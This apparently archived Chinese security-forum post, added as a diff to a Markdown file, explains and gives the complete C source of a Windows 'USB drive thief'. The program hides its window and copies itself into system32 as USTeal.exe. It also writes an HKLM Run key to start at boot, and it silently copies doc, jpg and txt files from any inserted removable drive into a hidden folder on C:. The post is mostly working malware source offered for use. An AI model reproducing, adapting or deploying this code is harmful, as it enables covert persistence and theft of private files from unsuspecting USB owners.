@@ -1,0 +1,230 @@
+
+# C 语言 SDK U 盘小偷
+
+> 原文：[`www.pediy.com/kssd/pediy12/143000.html`](https://www.pediy.com/kssd/pediy12/143000.html)
+
+程序工作原理：
+
+1、程序运行后将程序自身拷贝到系统目录。
+
+2、写注册表，实现开机自启动。
+
+3、在 C 盘下创建“U 盘小偷”目录（文件夹），以存放偷来的文件。
+
+4、检测是否有可移动设备插入电脑，如果有，获取当前系统时间，在"C:\U 盘小偷"目录下创建以 `SYSTEMTIME` 结构体的部分成员为名字的文件夹，保存本次盗窃成果。
+
+所有操作都在后台运行。
+
+由于程序在运行的时候会写注册表，这个操作会被具有主动防御功能的杀毒软件拦截。
+
+以下是程序源码：
+
+代码:
+
+```c
+#include "stdafx.h"
+#include <windows.h>
+#include <string>
+#include <stdio.h>
+#include <Dbt.h>
+#include <iostream>
+#include  "io.h"
+#include "tlhelp32.h" 
+#include "stdio.h" 
+using namespace std;
+
+
+void Dir(LPCTSTR lpPath);
+
+LRESULT CALLBACK WndProc(
+  HWND hwnd,      // handle to window
+  UINT uMsg,      // message identifier
+  WPARAM wParam,  // first message parameter
+  LPARAM lParam   // second message parameter
+);
+
+
+int APIENTRY WinMain(HINSTANCE hInstance,
+                    HINSTANCE hPrevInstance,
+                    LPSTR     lpCmdLine,
+                    int       nCmdShow)
+{
+
+    WNDCLASS wndclass;
+    wndclass.cbClsExtra=0;
+  wndclass.cbWndExtra=0;
+  wndclass.hbrBackground=(HBRUSH)GetStockObject(BLACK\_BRUSH);
+  wndclass.hCursor=LoadCursor(NULL,IDC\_ICON);
+  wndclass.hIcon=LoadIcon(NULL,IDI\_ASTERISK);
+  wndclass.hInstance=hInstance;
+  wndclass.lpfnWndProc=WndProc;
+  wndclass.lpszClassName="lieying";
+  wndclass.lpszMenuName=NULL;
+  wndclass.style=CS\_VREDRAW|CS\_HREDRAW;
+
+  RegisterClass(&wndclass);          //注册窗口类
+
+  HWND hwnd;
+  hwnd=CreateWindow("lieying","",WS\_OVERLAPPEDWINDOW,150,150,683,384,NULL,NULL,hInstance,NULL);
+  ShowWindow(hwnd,SW\_HIDE);       //隐藏窗体
+  UpdateWindow(hwnd);
+    MSG msg;
+  while(GetMessage(&msg,hwnd,0,0))      //消息循环
+  {
+    TranslateMessage(&msg);
+    DispatchMessage(&msg);
+  }
+
+  return 0;
+}
+
+
+LRESULT CALLBACK WndProc( HWND hwnd,   UINT uMsg,   WPARAM wParam,   LPARAM lParam  )   //窗口过程
+
+{
+  switch(uMsg)
+  {
+
+     case WM\_PAINT:
+       {
+          PAINTSTRUCT ps;
+            BeginPaint(hwnd,&ps);
+          EndPaint(hwnd,&ps);
+          break;
+       }
+
+     case WM\_CLOSE:
+       {
+         return FALSE;
+           break;
+       }
+
+     case WM\_DESTROY:
+       {
+          return FALSE;
+           break;
+       }
+     case WM\_CREATE:                                  //窗体创建时执行复制自身到系统目录，并写注册表实现开机启动。
+       {
+
+          TCHAR desdir\[MAX\_PATH\]=TEXT("c:\\\\U 盘小偷");  //创建目录，用来存放偷来的文件
+        CreateDirectory(desdir,NULL);
+
+        //文件复制
+        TCHAR ExeFullPath\[MAX\_PATH\];
+        GetModuleFileName(NULL,ExeFullPath,MAX\_PATH);   //获取 exe 的全路径(包括文件名)
+
+        TCHAR NewFilePath\[MAX\_PATH\]="C:\\\\WINDOWS\\\\system32\\\\USTeal.exe";  //指定文件 Copy 到哪里去。
+        CopyFile(ExeFullPath,NewFilePath,TRUE);   
+
+
+        //写注册表，实现开机运行。
+        HKEY hkey;
+        TCHAR keyvalue\[MAX\_PATH\]="C:\\\\WINDOWS\\\\system32\\\\USTeal.exe";  //判读下文件是否存在
+        TCHAR childkey\[\]=TEXT("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run");
+
+        RegOpenKeyEx(HKEY\_LOCAL\_MACHINE,childkey,0,KEY\_CREATE\_SUB\_KEY,&hkey);
+        RegSetValue(HKEY\_LOCAL\_MACHINE,childkey,REG\_SZ,keyvalue,strlen(keyvalue));
+        RegCloseKey(hkey);
+
+         break;
+       }
+
+
+    case WM\_DEVICECHANGE:         //移动存储设备插入电脑会产生 WM\_DEVICECHANGE 消息
+      {
+        if(lParam!=0)
+        {
+          PDEV\_BROADCAST\_HDR lpdb = (PDEV\_BROADCAST\_HDR)lParam;   //定义 PDEV\_BROADCAST\_HDR 结构体，系统填充结构体信息。
+          if(lpdb->dbch\_devicetype==DBT\_DEVTYP\_VOLUME)            {
+            if(wParam==DBT\_DEVICEARRIVAL)                      //移动存储设备已经可用。
+            {
+                long i,j;
+              TCHAR buf\[100\];
+              TCHAR \*cdbuf;
+              j=100;
+              i=GetLogicalDriveStrings(j,buf);
+              for(j=0;j<i;j+=4)
+              {
+                cdbuf=&buf\[j\];
+                if(GetDriveType(cdbuf)==DRIVE\_REMOVABLE)   //判断插入设备的类型是否为可移动设备
+                {
+                  Dir((LPCTSTR)cdbuf);
+                   
+                }
+              }
+
+            }
+          }
+        }
+
+
+      }
+      break;
+
+       default:
+       {
+          return DefWindowProc(hwnd,uMsg,wParam,lParam);
+          break;
+       }
+  }
+
+  return 0;
+}
+
+
+void Dir(LPCTSTR lpPath)
+{
+  TCHAR szFind\[MAX\_PATH\];
+  lstrcpy(szFind,lpPath);
+  lstrcat(szFind,"\\\\\*.\*");
+    WIN32\_FIND\_DATA  wfd;
+  HANDLE hFind=FindFirstFile(szFind,&wfd);
+    if(hFind == INVALID\_HANDLE\_VALUE)
+    return;
+  else
+  {
+    do
+    {
+            if (wfd.cFileName\[0\] == '.')   
+            continue; //过滤本级目录和父目录
+
+            if (wfd.dwFileAttributes & FILE\_ATTRIBUTE\_DIRECTORY)   //如果找到的是目录
+      {
+        TCHAR szFile\[MAX\_PATH\];
+        lstrcpy(szFile,lpPath);
+        lstrcat(szFile,"\\\\");
+        lstrcat(szFile,wfd.cFileName);
+        Dir(szFile);      // 递归
+      }
+
+      else  //找到的是文件
+      {
+        TCHAR szFile\[MAX\_PATH\];
+        lstrcpy(szFile,lpPath);
+        lstrcat(szFile,"\\\\");
+        lstrcat(szFile,wfd.cFileName);
+        int len=lstrlen(szFile);
+        TCHAR \*p=&szFile\[len-3\];
+        if(lstrcmp(p,"doc")==0||lstrcmp(p,"jpg")==0||lstrcmp(p,"txt")==0) //要拷贝文件的后缀，我这里只拷贝 doc,jpg,txt 文件。
+        {
+          TCHAR szDes\[MAX\_PATH\]=TEXT("C:\\\\U 盘小偷\\\\");
+          TCHAR szTime\[MAX\_PATH\];
+          SYSTEMTIME time;
+          GetLocalTime(&time);   //获取当前系统时间，将文件夹的名字以 SYSTEMTIME 结构体的部分成员为目标文件名
+          wsprintf(szTime,"%d 月%d 日%d 时%d 分",time.wMonth,time.wDay,time.wHour,time.wMinute);
+                lstrcat(szDes,szTime);
+          CreateDirectory(szDes,NULL);
+          lstrcat(szDes,"\\\\");
+          lstrcat(szDes,wfd.cFileName);
+          CopyFile(szFile,szDes,FALSE); //拷贝文件
+             
+        }
+      }
+    }
+
+    while(FindNextFile(hFind, &wfd));
+        FindClose(hFind);
+  }
+}
+```
